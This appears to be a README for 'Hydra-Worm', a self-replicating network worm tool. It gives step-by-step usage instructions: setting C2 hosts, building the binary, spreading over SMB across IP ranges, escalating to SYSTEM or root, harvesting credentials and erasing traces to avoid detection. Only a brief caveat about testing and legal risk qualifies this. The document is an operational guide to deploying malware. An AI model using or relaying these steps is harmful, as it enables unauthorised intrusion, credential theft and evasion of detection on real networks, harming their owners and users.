# Hydra-worm
Hydra-Worm is a rogue self-replicating exploit that tears through networks like a digital virus with a mind of its own. Kill one process, two more spawn. It mutates its code, dodges detection, opens hidden backdoors, and spreads laterally across systems. Built to persist, adapt, and dominate the grid.


To execute the Hydra Worm, follow these steps:

1. Clone the Repository: Clone the Hydra Worm repository using Git or download the source code directly. Make sure you have Python 3.8 or higher installed on your system.

2. Install Dependencies: Install the required dependencies by running `pip3 install -r requirements.txt` in the repository root. This command installs all necessary Python packages.

3. Configure Settings: Edit the `config.py` file to set your desired settings, such as the encryption key, C2 hosts, and spread interval. Make sure to set a strong encryption key for payload protection.

4. Build the Worm: Run `python3 hydra.py build` to generate the worm binary. You can customize the payload and encryption methods during this step.

5. Spread the Worm: Use the `python3 hydra.py spread` command to spread the worm across the network. You can target specific IP ranges or use the `-s` option to scan for open SMB ports automatically.

6. Escalate Privileges: Once you've infected a machine, use the `python3 hydra.py escalate` command to escalate privileges to SYSTEM or root. Choose the appropriate escalation method based on the target system's configuration.

7. Harvest Credentials: Run `python3 hydra.py harvest` to extract credentials from infected machines. This command uses various techniques to extract passwords and login information.

8. Clean Up: After completing your mission, run `python3 hydra.py cleanup` to remove any traces of the worm from the infected systems. This step is optional but recommended to avoid detection.

Remember to always test the worm in a controlled environment before deploying it in the wild. The Hydra Worm is a powerful tool for network exploitation, but improper use can lead to legal consequences.
